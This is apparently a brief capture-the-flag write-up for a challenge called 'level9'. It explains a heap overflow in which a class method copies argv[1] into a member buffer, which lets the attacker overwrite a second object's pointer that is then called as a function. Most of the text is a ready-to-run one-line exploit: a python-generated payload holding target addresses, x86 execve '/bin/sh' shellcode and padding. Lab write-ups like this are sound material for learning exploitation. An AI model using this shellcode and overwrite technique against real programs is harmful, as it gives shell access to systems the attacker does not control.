this code allocates two instances of a class, and that class has a method that copies a string into it's member `char *`. The program gives the `argv[1]` as an argument to that method, which allows us to overflow the member variable and to write an address of a shellcode into the second instance member variable which then gets used as a function pointer on the next line.

```bash
./level9 `python -c 'print "\x10\xa0\x04\x08\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"'`
```